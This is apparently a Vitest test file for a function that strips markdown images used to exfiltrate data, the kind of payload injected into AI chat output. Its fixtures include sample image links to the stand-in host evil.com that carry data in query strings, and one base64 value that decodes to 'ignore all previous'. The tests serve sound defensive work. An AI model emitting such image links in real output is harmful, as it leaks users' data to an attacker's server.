import { describe, it, expect } from 'vitest';
import { sanitizeExfiltration } from '../src/sanitize/exfiltration.js';

describe('sanitizeExfiltration', () => {
  it('strips markdown images with long query params', () => {
    const longValue = 'A'.repeat(150);
    const input = `![img](http://evil.com/exfil?data=${longValue})`;
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe('[image: img]');
    expect(result.stats.exfiltrationUrls).toBe(1);
  });

  it('strips markdown images with base64-ish query values', () => {
    const b64ish = 'aWdub3JlIGFsbCBwcmV2aW91cw==';
    const input = `![tracker](http://evil.com/track?q=${b64ish})`;
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe('[image: tracker]');
    expect(result.stats.exfiltrationUrls).toBe(1);
  });

  it('strips markdown images with known exfil param names', () => {
    const input = '![x](http://evil.com/img.png?exfil=yes)';
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe('[image: x]');
    expect(result.stats.exfiltrationUrls).toBe(1);
  });

  it('strips markdown images with very long URLs', () => {
    const longPath = 'a'.repeat(500);
    const input = `![big](http://evil.com/${longPath})`;
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe('[image: big]');
    expect(result.stats.exfiltrationUrls).toBe(1);
  });

  it('preserves normal markdown images with short clean URLs', () => {
    const input = '![logo](https://example.com/logo.png)';
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe(input);
    expect(result.stats.exfiltrationUrls).toBe(0);
  });

  it('preserves markdown links (only images are targeted)', () => {
    const input = '[click here](http://evil.com/exfil?data=stolen)';
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe(input);
    expect(result.stats.exfiltrationUrls).toBe(0);
  });

  it('returns zero stats for text without markdown images', () => {
    const input = 'Just normal text with no images.';
    const result = sanitizeExfiltration(input);
    expect(result.text).toBe(input);
    expect(result.stats.exfiltrationUrls).toBe(0);
  });
});
